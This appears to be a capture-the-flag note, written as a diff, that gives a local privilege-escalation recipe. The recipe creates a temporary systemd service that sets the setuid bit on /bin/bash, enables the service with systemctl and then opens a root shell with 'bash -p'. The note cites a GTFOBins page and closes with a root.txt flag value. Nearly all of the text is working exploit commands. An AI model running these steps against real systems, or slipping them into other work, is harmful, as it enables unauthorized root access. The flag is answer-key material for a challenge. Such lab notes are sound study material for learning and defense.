@@ -1,0 +1,15 @@
+TF2=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF2
+/bin/systemctl link $TF2
+/bin/systemctl enable --now $TF2
+/bin/bash -p
+
+more infomation in this link : 'https://gtfobins.github.io/gtfobins/systemctl/'
+
+become root
+
+password at root.txt : a58ff8579f0a9270368d33a9966c7fd5
